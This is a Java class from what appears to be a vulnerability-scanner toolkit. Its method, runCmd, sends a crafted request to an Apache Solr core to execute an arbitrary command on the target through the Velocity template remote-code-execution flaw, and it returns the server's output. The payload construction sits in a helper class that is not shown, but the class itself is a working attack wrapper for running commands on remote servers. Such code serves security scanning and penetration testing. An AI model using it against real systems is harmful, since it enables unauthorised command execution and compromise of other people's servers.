package com.gbw.scanner.plugins.scripts.web.solr.velocity;


import com.gbw.scanner.Host;
import com.gbw.scanner.http.GBWHttpClientBuilder;
import com.gbw.scanner.http.GBWHttpResponse;
import com.gbw.scanner.plugins.scripts.web.solr.GBWScanSolrScriptConfig;
import com.gbw.scanner.plugins.scripts.web.solr.SolrHttpRequestBuilder;
import com.gbw.scanner.utils.HttpUtils;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.CloseableHttpClient;

import java.io.IOException;

public class GBWSolrVelocityRCEAttack {


    public static String runCmd(String proto,String host,int port,String core,String cmd) {

        String res = "";
        GBWScanSolrScriptConfig config = new GBWScanSolrScriptConfig();
        config.setCmd(cmd);
        config.setEncode(false);
        config.setConTimeout(100000);
        config.setReadTimeout(100000);

        Host h = new Host(host,host,port,null,proto);


        HttpUriRequest httpRequest = null;
        CloseableHttpClient httpClient = null;
        GBWHttpResponse httpResponse;

        try {
            httpClient = GBWHttpClientBuilder.make(h.getProto(), h.getPort());
            SolrHttpRequestBuilder.makeSolrCoreAttackRequest(h, config, core);

            httpRequest = SolrHttpRequestBuilder.makeSolrCoreAttackRequest(h,config,core);

            httpResponse = HttpUtils.send(httpClient,httpRequest,true);

            res = httpResponse.getContent();

        }catch (Exception e){
            res =  e.getMessage();
        }finally {
            if(httpClient!=null) {
                try {
                    httpClient.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        return res;

    }


}
